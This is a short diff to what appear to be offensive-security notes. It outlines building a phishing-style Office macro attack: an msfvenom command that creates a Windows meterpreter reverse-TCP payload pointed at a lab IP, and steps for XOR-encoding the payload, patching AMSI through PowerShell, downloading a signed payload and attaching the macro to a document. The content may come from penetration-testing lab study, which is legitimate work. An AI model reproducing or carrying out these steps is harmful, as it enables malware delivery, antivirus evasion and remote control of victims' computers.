@@ -20,4 +20,5 @@ sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.49.141  LPORT
 
 4. Create malicious marco with amsi bypass and download our malicou payload to remote host, 
 - encode the marco content with powershell  [marco  xor Payload encoder](/msf/payloadencoder.ps)
-- Craft the [marco full download with asmi](/msf/asmibypasswithxor.vba)
+- [test.txt](/msf/test.txt) contains amsi powershell patching and web invoke request to download our encoded and digitally signed payload
+- Craft the [marco](/msf/asmibypasswithxor.vba) and attached to a doc file
